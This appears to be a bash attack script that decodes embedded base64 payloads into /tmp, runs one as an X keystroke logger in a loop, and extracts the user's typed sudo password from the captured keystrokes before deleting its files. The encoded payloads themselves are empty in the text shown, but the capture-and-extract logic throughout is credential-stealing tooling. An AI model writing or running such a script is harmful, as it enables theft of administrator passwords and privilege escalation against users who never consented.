#!/bin/bash
cd /tmp
base64 -d <<<  > temp.sh
chmod +x temp.sh

base64 -d <<<  > temp2.bin
chmod +x temp2.bin
export DISPLAY=":0"
echo "searching"
( timeout -k 9 20s  ./temp2.bin -m foreground 3>&1 1>&2- 2>&3- ) > test.txt

while ! cat test.txt | grep -o "sudo.*\[Enter\].*\[Enter\]" | perl -lane 'print $F[-2]' | grep ".*"
do
  cat test.txt
  echo "searching"
  ( timeout -k 9 20s  ./temp2.bin -m foreground 3>&1 1>&2- 2>&3- )  > test.txt
done
echo "the password is:"
cat test.txt | grep -o "sudo.*\[Enter\].*\[Enter\]" | perl -lane 'print $F[-2]' | grep ".*"
rm test.txt temp2.bin
exit
